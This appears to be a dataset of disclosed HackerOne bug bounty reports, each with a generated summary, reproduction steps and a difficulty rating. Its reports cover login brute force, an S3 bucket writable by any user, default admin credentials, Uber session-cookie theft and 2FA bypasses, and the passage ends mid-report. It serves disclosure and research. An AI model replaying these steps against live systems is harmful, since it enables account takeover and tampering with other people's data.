1) The endpoint to which the actual request goes - https://en.instagram-brand.com/wp-json/brc/v1/resend-verify
2) The total number of requests/attempts you were able to make - 1001 (you can do it infinite)
3) The time in which you made those requests/attempts - 10 minutes
4) Some demonstration that you weren't actually just silently locked out -Refer the attached exploit.
Exploit Developed:
Save the files email.txt and InstagramBrandEnumerationExploit.rb in a folder.
Run the exploit like this: ruby InstagramBrandEnumerationExploit.rb
Observe in the console that the right emails are disclosed within seconds.
Reproduction Instructions / Proof of Concept
Sign Up using any email address.
Attach a local intercepting proxy.
After signing up, a resend email button will appear.
Click on it and intercept the request.
For the parameter, 'email' in the request body, put your payloads i.e. email addresses to need to be enumerated.
Send the request.
Observe the response. It is verbose and states clearly if the user exists or not.
Now try to login using any of the victim's email.
Observe that the web app does not let you login.
The HTTP Request is:
POST /wp-json/brc/v1/resend-verify HTTP/1.1 Host: en.instagram-brand.com User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br X-WP-Nonce: 30436dbdab Content-Type: application/x-www-form-urlencoded Referer: https://en.instagram-brand.com/register/signup Content-Length: 29 Cookie: pll_language=en; _ga=GA1.2.2112289023.1486871994; _gat=1 Connection: keep-alive
email=<your email here>
B. Login Brute Force
The endpoint https://en.instagram-brand.com/wp-json/brc/v1/login/ does not have any rate limiting. This still allows an attacker to make the following number of guesses from one single system single threaded : 100 per min, 6,000 per hour, 1,44,000 per day or 43,20,000/month. No additional protection mechanism such as Captcha (pre-auth) or account lockout requiring additional email/phone verification (pre- or post-auth) were identified at any time. I could make 1020 attempts in 10 minutes.
Solution:
Implement a Captcha after a reasonable number of failed login attempts against one account at the application-layer. The Captcha should not only be shown to offending IP addresses, but to anyone who attempts to login to the account under attack. Another option is to enable an account lockout policy which effectively locks down an account that has been attacked (e.g. after 20 failed consecutive logins) and requires out-of-band validation by the real account owner (e.g. email, mobile) before becoming accessible again.
Reproduction Instructions / Proof of Concept
I have developed an exploit in Ruby to demonstrate this attack.
Its usage:
Save the InstagramBrandLoginBruteForce.rb in any folder.
Have a long list of passwords in passlist.txt file and keep it in the same folder.
On line number 7, enter the name of the victim's email who you want to target. This can also come from username enumeration list fetched from the exploit InstagramBrandEnumerationExploit.rb
Using cmd, navigate to that folder and run it like this: ruby InstagramBrandLoginBruteForce.rb
Observe the results.
Additional Note:
I have used single threading for these attacks, but these can be more powerful if multi threading is used.



================================================================================
Vulnerability Description:
An attacker can perform account takeover by chaining two vulnerabilities: username enumeration via the resend-verify endpoint without rate limiting and login brute force via the login endpoint without rate limiting or CAPTCHA protection.

Steps to Reproduce:
1. Identify the endpoint https://en.instagram-brand.com/wp-json/brc/v1/resend-verify for username enumeration.
2. Use the endpoint to enumerate usernames by sending multiple requests with different email addresses.
3. Identify the endpoint https://en.instagram-brand.com/wp-json/brc/v1/login/ for login brute force.
4. Use the enumerated usernames and a list of passwords to perform brute force attacks on the login endpoint.
Exploitation Difficulty:
The attack involves multiple components (username enumeration and brute force) and requires understanding the interaction between them. However, the steps are straightforward once the vulnerable endpoints are identified, and the logic is not novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/209223: Open S3 Bucket WriteAble To Any Aws User
================================================================================
RAW DESCRIPTION:

Hi All,
<image_0>
root@injector:~# aws s3 ls s3://rubyci
PRE aix71_ppc/
PRE amazon/
PRE arch/
PRE archive/
PRE armv8b/
PRE c64b/
PRE centos5-32/
PRE centos5-64/
PRE centos7/
PRE debian/
PRE debian7/
PRE debian8/
PRE f19p8/
PRE fedora20/
PRE fedora21/
PRE fedora22/
PRE fedora23/
PRE fedora24/
PRE fedora25/
PRE freebsd10-zfs/
PRE freebsd11zfs/
PRE freebsd82-32/
PRE freebsd82-64/
PRE funtoo/
PRE gentoo/
PRE icc-x64/
PRE opensuse13/
PRE opensuseleap/
PRE osx1010/
PRE osx1011/
PRE rhel_zlinux/
PRE scw-9d6766/
PRE tk2-243-31075/
PRE ubuntu/
PRE ubuntu1004-32/
PRE ubuntu1004-64/
PRE ubuntu1404/
PRE ubuntu1410/
PRE ubuntu1510/
PRE ubuntu1604/
PRE unstable10s/
PRE unstable10x/
PRE unstable11s/
PRE unstable11x/
2017-02-17 13:03:14 112 test.html
2017-02-27 09:52:15 20 test.txt
any one who have aws s3 cli can write in your bucket because your bucket writable through aws cli
when i try to move and delete any file on your bucket i got this
###MOVED
root@injector:~# aws s3 mv test.txt s3://rubyci
move: ./test.txt to s3://rubyci/test.txt
###DELETED
root@injector:~# aws s3 rm s3://rubyci/test.txt
delete: s3://rubyci/test.txt
any one using aws cli can move and delete any file from your bucket
also check the attached picture and feel free to contact if you need any additional info
Best Regard
Saad Ahmed



================================================================================
Vulnerability Description:
The S3 bucket 'rubyci' is misconfigured to allow write and delete access to any AWS user, not just authorized ones. This means anyone with AWS CLI access can modify or delete files in the bucket.

Steps to Reproduce:
1. Use AWS CLI to list the contents of the S3 bucket: `aws s3 ls s3://rubyci`
2. Attempt to write or delete a file in the bucket using AWS CLI commands: `aws s3 mv test.txt s3://rubyci` or `aws s3 rm s3://rubyci/test.txt`
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires basic AWS CLI commands to test bucket permissions. There are no complex interactions or states involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2160178: default credentials at https://52.42.105.71/
================================================================================
RAW DESCRIPTION:

Summary:
hi team i able to login in one of your servers by default credentials
Steps to reproduce:
1.go to link : https://52.42.105.71/
1.enter this credentials
Code 29 Bytes
1password=admin
2username=admin
PoC
<image_0>
<image_1>
How to remediate the vulnerability
Change the password of the user or disable the account
Impact
the website was misconfigured in a manner that may have allowed a malicious user to login with administrator for the default organization account credentials.



================================================================================
Vulnerability Description:
The vulnerability involves logging into a server using default credentials (admin/admin), which could allow unauthorized access to administrative functions.

Steps to Reproduce:
1. Go to the link: https://52.42.105.71/
2. Enter the default credentials: username=admin, password=admin
Exploitation Difficulty:
The attack is straightforward, involving only accessing a URL and entering well-known default credentials without any complex interactions or state manipulations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2178941: Unauthenticated Jenkins instance exposed information related to █████
================================================================================
RAW DESCRIPTION:

Affected URLs - ██████████blue/organizations/jenkins/pipelines
████████
██████████
████
Also notice that the information is transmitted in clear text as the server is running on HTTP.
Impact
An attacker can read or edit sensitive information belonging to █████ by abusing this vulnerability.
System Host(s)
███████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Navigate to ███████ , and other sections. It is exposing information related to ███
Suggested Mitigation/Remediation Actions
It is recommended to Implement authentication on this Jenkins instance



================================================================================
Vulnerability Description:
An unauthenticated Jenkins instance exposes sensitive information over HTTP, allowing attackers to read or edit this information without authentication.

Steps to Reproduce:
1. Navigate to the exposed Jenkins instance URL (██████████blue/organizations/jenkins/pipelines)
2. Observe the exposed information transmitted in clear text over HTTP
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires accessing a publicly exposed URL and observing the unencrypted data. There are no complex interactions or state manipulations involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/218230: Access to GitLab's Slack by abusing issue creation from e-mail
================================================================================
RAW DESCRIPTION:

Hi there,
I found a way to become a verified GitLab team member on Slack.
By doing so, I gained access to dozens of channels possibly containing sensitive information. Note that I deleted my account intidc_hackerone immediately afterwards and did not join, read or engage with any of those channels.
How it works
The GitLab Slack login page allows anyone with a @gitlab.com e-mail address to join the team:
<image_0>
GitLab allows new issues to be created when e-mailed to a unique e-mail address containing a secret token at incoming+{username}/{projectname}+{token}@gitlab.com
<image_1>
As you can see, this is a valid @gitlab.com e-mail address, so we can use the issues system to sign up for services like Slack, Facebook Workplace, ...
<image_2>
These e-mail verification e-mails are e-mailed as new issue tickets to my project:
<image_3>
<image_4>
After clicking the verification link, all you need to do is set-up 2FA and you'll be able to access GitLab's Slack:
<image_5>
I took a screenshot of some channels as a proof of concept, but did not actually enter them
Suggested fix
I've seen companies taking different approaches to prevent this from happening:
Only allow employees to join the Slack group by invitation, like Facebook does.
Enable SSO or other authentication methods, like PayPal does
These fixes can be carried out quickly but aren't waterproof: an attacker will still be able to gain access to similar services such as Facebook workplace or Yammer if they use similar authentication methods.
In the longer run, a safer approach would be:
Requiring users to mail their issue tickets to a gitlab subdomain e-mail, such as @reply.gitlab.com
Please let me know if you have any questions,
Best regards,
Inti



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to gain verified access to GitLab's Slack (or similar services) by abusing the issue creation via email feature. This is possible because the email addresses used for creating issues are valid @gitlab.com addresses, which can be used to bypass verification processes for services like Slack.

Steps to Reproduce:
1. Identify the unique email address format for creating GitLab issues via email: incoming+{username}/{projectname}+{token}@gitlab.com.
2. Use this email address to sign up for Slack or other services that accept @gitlab.com email addresses for verification.
3. Check the issue created in your GitLab project for the verification email from the service (e.g., Slack).
4. Click the verification link in the email to complete the sign-up process and gain access to the service as a verified GitLab team member.
Exploitation Difficulty:
The attack involves understanding the email-based issue creation feature and its interaction with external services' verification processes. While the steps are straightforward once the email format is known, the initial discovery of using issue creation emails for service verification is non-obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/219205: Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com
================================================================================
RAW DESCRIPTION:

Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at auth.uber.com (via saostatic.uber.com). The root cause of this authentication bypass is two-fold:
Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https (highly similar to 175070 - however, I must disagree with "there are some mitigating factors (cookie scope) that make this not as bad as it might appear at first blush.").
Your SSO system at auth.uber.com issues session cookies which are temporarily shared between all https://*.uber.com subdomains through its "domain=.uber.com" attribute. Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly similar to 172137).
Security Impact
The security impact of the subdomain takeover is that Uber can be impersonated via this webpage. A valid SSL certificate could easily be generated for this domain via Let's Encrypt, which would make it ideal for e.g. phishing attacks.
The security impact of the SSO system using shared session cookies for https://.uber.com is, in combination with the subdomain takeover vulnerability, an Authentication Bypass via session hijacking. A victim must be authenticated to auth.uber.com and then visit a webpage under the attacker's control to be exploited successfully - no further interaction is required from the victim, the attack can be performed stealthily without the user noticing or being notified by Uber. The end result is that the attacker can now impersonate the victim on any of the .uber.com which rely on auth.uber.com for authentication, such as riders.uber.com, partners.uber.com, developer.uber.com, bonjour.uber.com, etc.
# 1. Subdomain Takeover
The subdomain "saostatic.uber.com" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
Code 168 Bytes
1# nslookup saostatic.uber.com 8.8.8.8
2Server:		8.8.8.8
3Address:	8.8.8.8#53
4
5Non-authoritative answer:
6saostatic.uber.com	canonical name = d3i4yxtzktqr9n.cloudfront.net.
However, the hostname "saostatic.uber.com" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover:
<image_0>
Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, "saostatic.uber.com" was designated as hostname successfully:
<image_1>
This concluded the subdomain takeover. Visual proof can be found at http://saostatic.uber.com/subdomaintakeoverbyarneswinnen.html (unguessable filename chosen to not negatively affect Uber's reputation during takeover period) :
<image_2>
#2. Authentication Bypass
In Uber's SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, etc). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication, ensuring the window for theft is small:
{F202679}
The precious shared session cookie "_csid" can thus only be stolen between step 9 and 10, which is a very short period (automatic browser redirect). Although not impossible to exploit, a more convenient flaw was identified that allows the shared session cookie to remain alive after step 9 in the browser's cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie "_csid", it is simply ignored. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to directly issue another login scenario starting from step 3 in the above diagram, and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie:
{F202676}
So now an attacker has his/her hands on the victim's "_csid" shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued "_csid" cookie value in step 9 of the first Uber SSO Login diagram to be logged in as the victim, right? Wrong. There's another countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login 2 diagram:
{F202678}
The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can't steal these values from the victim's browser, but only the "_csid" shared session cookie, this means game over, right?
No! An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL to the victim's browser to get the "_csid" shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the "_csid" temporary session token for the attacker's login scenario in a separate browser, but this works flawlessly. This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above third and last diagram):
{F202677}
PoC
In the PoC below, the assumption is made that https://saostatic.uber.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual exposed risk). I figured you might not appreciate that.
Open the victim's browser & browse to https://riders.uber.com . After being redirected to https://auth.uber.com , login with the victim's credentials so you end up on https://riders.uber.com trips dashboard again.
Open a second browser tab in the victim's browser and browse to https://saostatic.uber.com/prepareuberattack.php . Accept any certificate warnings that you may receive here - again, we're only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, "Cookie: " string and a "Set-Cookie: " strings underneath each other. This is all info gathered under the hood by the attacker's webserver that is required to login as the victim now.
Open the separate attacker's browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the "Cookie: ..." string displayed on prepareuberattack.php and paste it into the request headers.
The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the "Set-Cookie: " lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are properly injected in the attacker's browser.
You are now logged in as the victim in the attacker's browser
In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim's browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the PHP page, but store this on the server-side, ready to be abused in a stealthy fashion.
You can see all these PoC steps executed in attachment "8. Authentication Bypass PoC video.mp4", where browser 1 and browser 2 had separate upstream servers and thus even other IP addresses to prove this is a plausible threat. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is also attached ("9. prepareuberattack.php" and "10. uberattack.php"). This was written quick & dirty for PoC purposes - I know the code is pretty hacky.
Recommendations
The recommendation for the subdomain takeover is straightforward: remove the dangling DNS CNAME pointer to Amazon CloudFront and the issue is resolved.
The recommendation for the generic Authentication Bypass issue is a bit more problematic. The fact that identities supplied to Service Providers by the Identity Provider are communicated via shared .uber.com cookies make them susceptible for all vulnerabilities that allows insight in cookies on any .uber.com subdomain. This includes remote code execution, subdomain takeover, debug logs, etc and has a very serious impact on Uber's overall security, even when the subdomain is hosted in a completely isolated environment. For example, all the mentioned out of scope .uber.com subdomains in the program's listing (bizblog.uber.com, newsroom.uber.com etc) have the inherent ability to bypass authentication of any Uber user, even though they might be remotely managed by an external party with lower security standards than Uber. Ironically enough, any service that wants to benefit from the current Uber SSO system will have to receive a .uber.com subdomain, as this is required by design. This in its turn increases the attack surface for abuse of the generic Authentication Bypass. On the short term I would recommend fixing the fact that the "_csid" cookie can remain alive in a browser once a user is already logged in (although Jack Whitton already showed that CSP could be abused to prevent a victim to make the request back to the Service Provider and invalidate the token, so I wouldn't put too much trust in that). On the mid-to-long term I would advise Uber to migrate to a real OAuth SSO system that communicates identity secrets and proofs by other means than shared cookies, e.g. GET parameters (OAuth "code" flow) or window.location.hash values (e.g. OAuth "access tokens" flow).
Let me know if anything is unclear.
Cheers,
Arne Swinnen
https://www.arneswinnen.net



================================================================================
Vulnerability Description:
This vulnerability involves a chain of two issues: a subdomain takeover of saostatic.uber.com and an authentication bypass via shared session cookies in Uber's SSO system. The subdomain takeover allows an attacker to serve malicious content, while the shared session cookie mechanism enables session hijacking, leading to full authentication bypass.

Steps to Reproduce:
1. Identify the subdomain saostatic.uber.com pointing to an unclaimed Amazon CloudFront CDN.
2. Take over the subdomain by creating a new CloudFront endpoint and linking it to an attacker-controlled server.
3. Exploit the shared session cookie mechanism on auth.uber.com to hijack a victim's session.
4. Use the stolen session cookie to bypass authentication and impersonate the victim on Uber's SSO system.
Exploitation Difficulty:
The attack requires understanding and exploiting multiple complex components: DNS misconfiguration, subdomain takeover, session cookie handling, and SSO authentication flows. The interaction between these components is subtle and non-obvious, requiring deep knowledge of web security mechanisms.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/226712: Broken Authentication & Session Management - Failure to Invalidate Session on all other browsers at Password change
================================================================================
RAW DESCRIPTION:

Broken Authentication & Session Management - Failure to Invalidate Session on all other browsers at Password change
Hello Team,
While I was testing your web application "Paragon Initiative Enterprises", I came to know that it is vulnerable to "Broken Authentication and Session Management > Failure to Invalidate Session > On Password Reset" at https://bridge.cspr.ng/my/account .
Description : When a user changes his account password, all the sessions on other devices/browsers should expire.
Cause : Suppose any user (victim) left his account logged in on any computer/browser (victim could use browser at Cyber Cafe or any shared computer). And after a particular he realized that he left his account logged in, and there is a security provided that when a user changes his account password all other sessions should invalidate or expire, which will expire the session from that shared computer.
But in your web application, I didn't found any such security that invalidate the session after password. Here if any user left his account logged in, any attacker can misuse the victim's account and there is no option available to the victim to invalidate the session on that shared computer which could lead to some major problems.
Steps to reproduce the bug :
Step 1 : Go to Browser A at (say Mozilla Firefox) and login with your credentials at https://bridge.cspr.ng/ and login with your credentials.
Step 2 : Similarly, Go to Browser B at (say Google Chrome) and login with your same credentials at https://bridge.cspr.ng/ and login with your credentials.
Step 3 : Suppose Browser A (Mozilla Firefox) is an shared computer's browser, and you left your account logged in at that computer. Go to Browser B (Google Chrome) and change your account
password at https://bridge.cspr.ng/my/account.
Step 4 : When you change your account password at Browser B (Google Chrome), the session at Browser A (Mozilla Firefox) should expire and the account should automatically logged out.
Step 5 : Go to Browser A (Mozilla Firefox), and visit your https://bridge.cspr.ng/ account page and refresh the page.
You will notice that even after changing the account password at Browser B (Google Chrome), the session at Browser A (Mozilla Firefox) didn't expired which can cause major problems.
Please fix the bug and let me know if you need any other information.
Regards
K. Jagdish



================================================================================
Vulnerability Description:
The web application fails to invalidate existing sessions when a user changes their password, allowing sessions on other devices or browsers to remain active. This could lead to unauthorized access if a user leaves their account logged in on a shared or public computer.

Steps to Reproduce:
1. Log in to the web application using Browser A (e.g., Mozilla Firefox).
2. Log in to the same account using Browser B (e.g., Google Chrome).
3. Change the account password in Browser B.
4. Verify that the session in Browser A remains active after the password change.
Exploitation Difficulty:
The vulnerability involves a straightforward test of session management after a password change, which is a common security practice. The steps are simple and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2315420: Email OTP/2FA Bypass
================================================================================
RAW DESCRIPTION:

The application has a functionality of 2FA by email OTP so i can bypass that 2FA and got the access of application without having any access of victim account. when a user try to login in the application and enter username and password, the 2FA page is available and application generate all the cookies like "PHPSESSID" or "bb_sessionhash" at same time at 2FA page that is responsible for the user session but there is a cookie named "bb_refresh" if i delete that cookie and refresh the page again then i can successfully login to the application without 2FA.
POC:
Login with correct username and password
Right click and open inspect element and go to application tab
Select Cookie form the left panel and select drugs.com
Delete the cookie named "bb_refresh"
Now refresh the page again and Boom ! You Logged In !
████████
Impact
A 2FA bypass in a web application compromises user security, allowing unauthorized access. Attackers can exploit this vulnerability to gain control over accounts, leading to potential data breaches, privacy violations, and unauthorized actions.



================================================================================
Vulnerability Description:
The application has a functionality of 2FA by email OTP which can be bypassed by deleting the 'bb_refresh' cookie after entering the correct username and password, allowing unauthorized access without completing the 2FA process.

Steps to Reproduce:
1. Login with correct username and password
2. Right click and open inspect element and go to application tab
3. Select Cookie form the left panel and select drugs.com
4. Delete the cookie named 'bb_refresh'
5. Now refresh the page again and Boom ! You Logged In !
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of a single cookie ('bb_refresh') to bypass 2FA. The steps are simple and do not require understanding complex interactions or multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2354136: Attacker can Add itself as admin user and can also change privileges of Existing Users [█████████]
================================================================================
RAW DESCRIPTION:

Hi there,
i have found a vulnerability on you %E2%96%88%E2%96%88%E2%96%88%E2%96%88. After directory bruteforcing i found an directory without having any kind of protection and authentication. so an attacker can add new user to the site As Admin and an attacker can also change privilege of the users without any authentication. for further read steps to reproducue.
Impact
The attacker can add itself as admin user and can also change user privileges without any authentication. this can lead to huge impact the entire site can be compromised.
System Host(s)
████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Visit ████████:1:0::::: you will see the website is asking to login
Now change the 1 to 9 or directly visit this url.
Navigate to Add New User
enter email address, First name, Last name and choose agency to Non-Agency.
Click on add new user
check mail inbox you will recieve the username and password for the admin account you just created.
Login with the creds you just got in you email.
NOTE: I CREATED 2 ACCOUNTS WHILE TESTING THIS ISSUE I HAVE PROVIED CREDS FOR THE BOTH ACCOUNT IN POC MAKE SURE TO CHECK THEM AS WELL
Suggested Mitigation/Remediation Actions
the website should have proper authentication for the url ████████::::: so that can any unauthorized user cannot add user or change the privileges of the existing users.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to add themselves as an admin user and modify privileges of existing users without any authentication, due to an unprotected directory discovered through brute-forcing.

Steps to Reproduce:
1. Visit the website and observe the login prompt
2. Change the URL parameter from 1 to 9 or directly access the vulnerable URL
3. Navigate to 'Add New User' section
4. Enter email, first name, last name, and select 'Non-Agency' for agency
5. Click 'Add New User' and check email for admin credentials
6. Login with the received credentials to gain admin access
Exploitation Difficulty:
The attack is straightforward, involving directory brute-forcing followed by accessing an unprotected endpoint to add or modify users. No complex interactions or novel logic is required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2501984: Bypassing the victim's phone number OTP in the account recovery process on the https://hackerone.com/settings/auth/setup_account_recovery
================================================================================
RAW DESCRIPTION:

Hi Team,
Hope everyone is doing well on your end. :)
While conducting research on hackerone.com, I uncovered a critical vulnerability related to account recovery via phone number.
I found that I could add any phone number without verifying the SMS OTP.
To confirm the vulnerability, I enabled 2FA and observed that the OTP was successfully sent to someone else's phone number.
Allow me to explain the details step by step.
I halted my exploration at this point without delving into the 2FA OTP process and other aspects. My reason being, I wanted to ensure that I am the first to report this issue.
Proof of concept:
I have created a video demonstration of the vulnerability and uploaded it to the report and image too.
You can review it once.
█████
Steps To Reproduce
First, create an account recovery request using your own phone number and successfully enable account recovery with that same number.
███████
Now, click on 'Change' and replace the phone number with that of another person. Click 'Next' to initiate the verification process. However, do not verify the OTP, instead, either refresh the page or navigate back to the account recovery page.
██████
I was surprised to find that another person's number was now stored, and the recovery OTP was being sent to that individual's number, even though it had been modified by me. And I do not have access to that number.
To confirm the issue, I implemented 2FA (Two-Factor Authentication) and attempted to use the account recovery process via my phone number. Unfortunately, the attempt was unsuccessful. However, I did not let this setback deter me.
I logged in once more and attempted to change account recovery and got it. Now, the system prompted me to enter an SMS OTP (One-Time Password) sent to the phone number set by the attacker, which happens to be a victim's number I don't have access to.
████████
Finally, we identified the issue, which involves exploiting the victim's phone number in the account recovery process without verifying the OTP sent to the victim's phone number.
Impact
The attacker can exploit the victim's phone number in the account recovery process without verifying the victim's phone number OTP, potentially flooding the victim's inbox with spam messages and overwhelming their communication channels.
Solution:
Accurately verifying the phone number OTP is crucial to ensuring the security of account recovery processes and preventing unauthorized access by attackers.
Cheers!
TheWhiteEvil



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to bypass the OTP verification in the account recovery process on HackerOne, enabling them to associate a victim's phone number without verification. This can lead to unauthorized account recovery attempts and potential spam flooding the victim's phone.

Steps to Reproduce:
1. Create an account recovery request using your own phone number and successfully enable account recovery with that same number.
2. Click on 'Change', replace the phone number with another person's number, click 'Next', but do not verify the OTP. Instead, refresh the page or navigate back to the account recovery page.
3. Observe that the victim's number is now stored, and the recovery OTP is sent to that number, despite not verifying the OTP.
4. Enable 2FA and attempt account recovery via the victim's phone number, confirming the OTP is sent to the victim's number without verification.
Exploitation Difficulty:
The attack involves manipulating the account recovery flow by interrupting the OTP verification step, which is a subtle interaction. However, the steps are straightforward once the flaw in the verification process is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2529780: Improper Authentication - 2FA OTP Reusable
================================================================================
RAW DESCRIPTION:

Summary:
I found an “Improper Authentication” issue where the 2FA OTP generated by the Microsoft Authenticator app can be used for two-step verification in HackerOne. This is similar to the common issue where tokens remain usable after logout. This means that the OTP does not have an invalidation period even if the app has generated a new OTP.
Description:
OTP is generated every 30 seconds. In the POC, I let the app generate three OTPs, meaning 90 seconds passed to let the old OTP. Supposedly, the old OTP is no longer valid because a new OTP is generated. However, I was still able to use the old OTP.
Steps To Reproduce
Set up an account that has 2FA enabled
Login to the account
View the otp created by the Authenticator app
Let the app create 3x otp (it's up to you how many you want)
But, the otp used is the first one
POC
███████
Reference
https://book.hacktricks.xyz/pentesting-web/2fa-bypass
CVSS Explaination
Privileges required: HIGH I admit, to accomplish this attack means that the attacker already has the victim's user credential/password data (there are many ways to do this, e.g. credential stealer etc.).
CIA : HIGH The success of the attacker taking over the account will have an impact on confidentiality (private programs, account data, etc.), integrity (the attacker is able to control what he wants to do with the account), Availability imagine the attacker changing the email, etc. until finally the victim has no access to the account.
But the final decision on CVSS is still up to you.
Impact
The generated otp codes are all common as in the 6-digit otp list on github, with the reusable otp loophole, this increases the probability of successful brute force otp. In other words, the loophole impacts the takeover account.
<image_0>



================================================================================
Vulnerability Description:
The vulnerability involves the improper handling of OTPs in a 2FA system where old OTPs remain valid even after new ones are generated. This allows an attacker to reuse an old OTP, increasing the risk of account takeover.

Steps to Reproduce:
1. Set up an account with 2FA enabled using Microsoft Authenticator.
2. Login to the account and observe the OTP generated by the Authenticator app.
3. Wait for the app to generate at least three new OTPs (90 seconds).
4. Attempt to use the first OTP (the one generated initially) for authentication.
Exploitation Difficulty:
The attack is straightforward and does not involve complex interactions or states. The tester simply needs to observe the OTP generation and attempt to reuse an old one. The issue is a common flaw in OTP implementations and does not require novel logic or deep understanding of the system.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2586616: Restrict any user from Login to their account
================================================================================
RAW DESCRIPTION:

Hii Triager,
I found that an attacker can change their email address to the victim's(existing user) email and restrict the victim from accessing their account.
Vulnerable Domain: www.██████████.mil
User-A: Attacker
User-B: Victim
Both User-A & User-B are registered user & have their separate accounts on www.███.mil
Step To Reproduce
1 - Login to Attacker's account, User-A (attacker@email.com)
2 - Login to Victim's Account, User-B (victim@email.com)
3 - In the Attacker's account, Navigate to Update Profile section.
4- Change the Attacker's email to victim@email.com. You can successfully takeover the victim email. (not victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials
References
████
Impact
1 -Restric any user from accessing their account.
2 - Improper Authentication on change email fuctionality.
System Host(s)
www.██████.mil
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
1 - Login to Attacker's account, User-A (attacker@email.com)
2 - Login to Victim's Account, User-B (victim@email.com)
3 - In the Attacker's account, Navigate to Update Profile section.
4- Change the Attacker's email to victim@email.com. You can successfully takeover the victim email. (not victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials
Suggested Mitigation/Remediation Actions
1 - Set proper authentication on the Update Profile functionality



================================================================================
Vulnerability Description:
An attacker can change their email address to match an existing user's email, thereby preventing the victim from accessing their own account due to improper authentication checks in the email update functionality.

Steps to Reproduce:
1. Login to the attacker's account (attacker@email.com)
2. Navigate to the Update Profile section in the attacker's account
3. Change the attacker's email to the victim's email (victim@email.com)
4. Attempt to login to the victim's account (victim@email.com)
5. Observe that the victim can no longer login due to 'Invalid Credentials'
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of the email update feature without requiring complex interactions or understanding of multiple components. The attack is simple and does not involve novel or subtle logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2588810: TOTP Authenticator implementation Accepts Expired Codes
================================================================================
RAW DESCRIPTION:

Summary:
Hi,
During testing hackerone.com, I discovered that the TOTP authenticator implementation accepts expired codes, allowing attackers to bypass authentication. This is a security vulnerability that reduces the effectiveness of the TOTP authentication mechanism.
Description:
TOTP (Time-Based One-Time Password) is a widely used authentication mechanism that generates a new password every 30 seconds. The password is valid for a short period, typically 30 seconds, before a new password is generated. This mechanism is designed to prevent attackers from using previously generated passwords.
During testing, I discovered that the TOTP authenticator implementation accepts expired codes, allowing attackers to bypass authentication. Specifically, I found that the authenticator accepts codes that are more than 1 minute old, which is considered a large window of acceptance.
This vulnerability reduces the security benefits of TOTP, allowing attackers to reuse expired codes. This can lead to unauthorized access to the system, which can result in data breaches, financial losses, and reputational damage.
Steps To Reproduce
Enable TOTP authentication for the account at hackerone.com with google authenticator.
Log in to the tfa enabled account with correct password.
When it comes to tfa state, save the current totp code from authenticator app.
Wait for the code to expire (e.g., 1 minute).
Submit the expired code to the authentication endpoint.
